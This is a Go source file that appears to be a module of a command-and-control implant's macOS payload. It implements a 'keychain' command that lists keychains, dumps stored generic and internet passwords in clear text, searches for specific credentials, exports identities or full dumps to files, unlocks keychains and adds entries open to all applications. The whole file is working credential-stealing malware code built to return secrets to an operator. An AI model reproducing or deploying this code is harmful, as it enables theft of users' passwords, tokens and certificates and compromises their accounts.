// server/docker/payloads/Darwin/action_keychain_darwin.go
//go:build darwin
// +build darwin

package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"strings"
	"time"
)

// KeychainCommand manages macOS keychain operations
type KeychainCommand struct{}

func (c *KeychainCommand) Name() string {
	return "keychain"
}

func (c *KeychainCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) < 1 {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	action := args[0]
	switch action {
	case "list":
		return c.listKeychains()
	case "dump":
		return c.dumpKeychain(args[1:])
	case "search":
		return c.searchKeychain(args[1:])
	case "add":
		return c.addToKeychain(args[1:])
	case "delete":
		return c.deleteFromKeychain(args[1:])
	case "export":
		return c.exportKeychain(args[1:])
	case "unlock":
		return c.unlockKeychain(args[1:])
	default:
		return CommandResult{
			Output:   ErrCtx(E21, action),
			ExitCode: 1,
		}
	}
}

// listKeychains lists all available keychains
func (c *KeychainCommand) listKeychains() CommandResult {
	var output strings.Builder

	// List default keychains
	cmd := exec.Command("security", "list-keychains")
	if result, err := cmd.Output(); err == nil {
		lines := strings.Split(string(result), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			line = strings.Trim(line, "\"")
			if line != "" {
				// Check if readable
				if _, err := os.Stat(line); err == nil {
					output.WriteString(fmt.Sprintf("%s (+)\n", line))
				} else {
					output.WriteString(fmt.Sprintf("%s (-)\n", line))
				}
			}
		}
	}

	// List login keychain
	cmd = exec.Command("security", "default-keychain")
	if result, err := cmd.Output(); err == nil {
		defaultKc := strings.TrimSpace(string(result))
		defaultKc = strings.Trim(defaultKc, "\"")
		output.WriteString(fmt.Sprintf("D:%s\n", defaultKc))
	}

	// Check for additional keychains in user directory
	if u, err := user.Current(); err == nil {
		keychainDir := filepath.Join(u.HomeDir, "Library", "Keychains")
		if entries, err := os.ReadDir(keychainDir); err == nil {
			for _, entry := range entries {
				if !entry.IsDir() && strings.Contains(entry.Name(), "keychain") {
					output.WriteString(fmt.Sprintf("U:%s\n", entry.Name()))
				}
			}
		}
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// dumpKeychain dumps keychain contents
func (c *KeychainCommand) dumpKeychain(args []string) CommandResult {
	keychainPath := ""

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--keychain":
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		}
	}

	var dumpOutput strings.Builder

	// Dump generic passwords
	cmd := exec.Command("security", "dump-keychain", "-d")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		// Parse output for passwords
		lines := strings.Split(string(result), "\n")
		currentItem := make(map[string]string)

		for _, line := range lines {
			line = strings.TrimSpace(line)

			if strings.HasPrefix(line, "keychain:") {
				if len(currentItem) > 0 {
					dumpOutput.WriteString(c.formatKeychainItem(currentItem))
					currentItem = make(map[string]string)
				}
				currentItem["keychain"] = strings.TrimPrefix(line, "keychain:")
			} else if strings.Contains(line, "\"acct\"") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem["account"] = strings.Trim(parts[1], " \"")
				}
			} else if strings.Contains(line, "\"svce\"") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem["service"] = strings.Trim(parts[1], " \"")
				}
			} else if strings.Contains(line, "\"desc\"") {
				parts := strings.Split(line, "=")
				if len(parts) > 1 {
					currentItem["description"] = strings.Trim(parts[1], " \"")
				}
			} else if strings.HasPrefix(line, "data:") {
				currentItem["data"] = strings.TrimPrefix(line, "data:")
			} else if strings.HasPrefix(line, "password:") {
				pwd := strings.TrimPrefix(line, "password:")
				pwd = strings.Trim(pwd, " \"")
				currentItem["password"] = pwd
			}
		}

		// Output last item
		if len(currentItem) > 0 {
			dumpOutput.WriteString(c.formatKeychainItem(currentItem))
		}
	} else {
		return CommandResult{
			Output:   ErrCtx(E3, stderr.String()),
			ExitCode: 1,
		}
	}

	// Dump internet passwords
	cmd = exec.Command("security", "find-internet-password", "-g", "-a", "")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	stderr.Reset()
	cmd.Stderr = &stderr
	if _, err := cmd.Output(); err == nil {
		// Parse stderr for passwords (security outputs passwords to stderr)
		dumpOutput.Write(stderr.Bytes())
	}

	// List certificates
	cmd = exec.Command("security", "find-certificate", "-a")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	if result, err := cmd.Output(); err == nil {
		lines := strings.Split(string(result), "\n")
		for _, line := range lines {
			if strings.Contains(line, "labl") || strings.Contains(line, "subj") {
				dumpOutput.WriteString(fmt.Sprintf("%s\n", strings.TrimSpace(line)))
			}
		}
	}

	return CommandResult{
		Output:      dumpOutput.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// formatKeychainItem formats a keychain item for display
func (c *KeychainCommand) formatKeychainItem(item map[string]string) string {
	var output strings.Builder
	output.WriteString("\n---\n")
	if service, ok := item["service"]; ok {
		output.WriteString(fmt.Sprintf("S:%s\n", service))
	}
	if account, ok := item["account"]; ok {
		output.WriteString(fmt.Sprintf("A:%s\n", account))
	}
	if desc, ok := item["description"]; ok {
		output.WriteString(fmt.Sprintf("D:%s\n", desc))
	}
	if password, ok := item["password"]; ok {
		output.WriteString(fmt.Sprintf("P:%s\n", password))
	}
	if data, ok := item["data"]; ok {
		// Try to decode hex data
		if decoded, err := base64.StdEncoding.DecodeString(data); err == nil {
			output.WriteString(fmt.Sprintf("V:%s\n", string(decoded)))
		} else {
			output.WriteString(fmt.Sprintf("V:%s\n", data))
		}
	}
	return output.String()
}

// searchKeychain searches for specific items
func (c *KeychainCommand) searchKeychain(args []string) CommandResult {
	var service, account, label string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--service":
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case "--account":
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		case "--label":
			if i+1 < len(args) {
				label = args[i+1]
				i++
			}
		}
	}

	var searchOutput strings.Builder

	// Search generic passwords
	cmd := exec.Command("security", "find-generic-password")
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}
	if label != "" {
		cmd.Args = append(cmd.Args, "-l", label)
	}
	cmd.Args = append(cmd.Args, "-g") // Show password

	var stderr bytes.Buffer
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		searchOutput.WriteString(Succ(S6) + "\n")
		searchOutput.Write(result)
		// Password is in stderr
		if stderr.Len() > 0 {
			searchOutput.Write(stderr.Bytes())
		}
	} else {
		searchOutput.WriteString(Err(E4) + "\n")
	}

	// Search internet passwords
	searchOutput.WriteString("\n")
	cmd = exec.Command("security", "find-internet-password")
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}
	if label != "" {
		cmd.Args = append(cmd.Args, "-l", label)
	}
	cmd.Args = append(cmd.Args, "-g")

	stderr.Reset()
	cmd.Stderr = &stderr

	if result, err := cmd.Output(); err == nil {
		searchOutput.WriteString(Succ(S6) + "\n")
		searchOutput.Write(result)
		if stderr.Len() > 0 {
			searchOutput.Write(stderr.Bytes())
		}
	} else {
		searchOutput.WriteString(Err(E4) + "\n")
	}

	return CommandResult{
		Output:      searchOutput.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// addToKeychain adds an item to the keychain
func (c *KeychainCommand) addToKeychain(args []string) CommandResult {
	var service, account, password string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--service":
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case "--account":
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		case "--password":
			if i+1 < len(args) {
				password = args[i+1]
				i++
			}
		}
	}

	if service == "" || account == "" || password == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Add to keychain
	cmd := exec.Command("security", "add-generic-password",
		"-s", service,
		"-a", account,
		"-w", password,
		"-T", "") // Allow access by all applications

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   Err(E11),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:      SuccCtx(S1, fmt.Sprintf("%s:%s", service, account)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// deleteFromKeychain deletes an item from the keychain
func (c *KeychainCommand) deleteFromKeychain(args []string) CommandResult {
	var service, account string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--service":
			if i+1 < len(args) {
				service = args[i+1]
				i++
			}
		case "--account":
			if i+1 < len(args) {
				account = args[i+1]
				i++
			}
		}
	}

	if service == "" && account == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Delete from keychain
	cmd := exec.Command("security", "delete-generic-password")
	if service != "" {
		cmd.Args = append(cmd.Args, "-s", service)
	}
	if account != "" {
		cmd.Args = append(cmd.Args, "-a", account)
	}

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   Err(E11),
			ExitCode: 1,
		}
	}

	return CommandResult{
		Output:      SuccCtx(S2, fmt.Sprintf("%s:%s", service, account)),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// exportKeychain exports keychain to a file
func (c *KeychainCommand) exportKeychain(args []string) CommandResult {
	var keychainPath, outputPath string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--keychain":
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		case "--output":
			if i+1 < len(args) {
				outputPath = args[i+1]
				i++
			}
		}
	}

	if outputPath == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Use security command to export
	cmd := exec.Command("security", "export")
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, "-k", keychainPath)
	}
	cmd.Args = append(cmd.Args, "-t", "identities", "-f", "pkcs12", "-o", outputPath)

	if _, err := cmd.CombinedOutput(); err != nil {
		// Try alternative export method - dump keychain to text file
		cmd = exec.Command("security", "dump-keychain", "-d")
		if keychainPath != "" {
			cmd.Args = append(cmd.Args, keychainPath)
		}

		if dumpOutputBytes, err := cmd.Output(); err == nil {
			if err := os.WriteFile(outputPath, dumpOutputBytes, 0600); err != nil {
				return CommandResult{
					Output:   ErrCtx(E11, outputPath),
					ExitCode: 1,
				}
			}
			return CommandResult{
				Output:      SuccCtx(S1, outputPath),
				ExitCode:    0,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		} else {
			return CommandResult{
				Output:   ErrCtx(E11, outputPath),
				ExitCode: 1,
			}
		}
	}

	return CommandResult{
		Output:      SuccCtx(S1, outputPath),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// unlockKeychain unlocks a keychain
func (c *KeychainCommand) unlockKeychain(args []string) CommandResult {
	var keychainPath, password string

	// Parse arguments
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--keychain":
			if i+1 < len(args) {
				keychainPath = args[i+1]
				i++
			}
		case "--password":
			if i+1 < len(args) {
				password = args[i+1]
				i++
			}
		}
	}

	if password == "" {
		return CommandResult{
			Output:   Err(E1),
			ExitCode: 1,
		}
	}

	// Unlock keychain
	cmd := exec.Command("security", "unlock-keychain", "-p", password)
	if keychainPath != "" {
		cmd.Args = append(cmd.Args, keychainPath)
	}

	if _, err := cmd.CombinedOutput(); err != nil {
		return CommandResult{
			Output:   Err(E3),
			ExitCode: 1,
		}
	}

	var result string
	if keychainPath != "" {
		result = SuccCtx(S29, keychainPath) + "\n"
	} else {
		result = Succ(S29) + "\n"
	}

	return CommandResult{
		Output:      result,
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
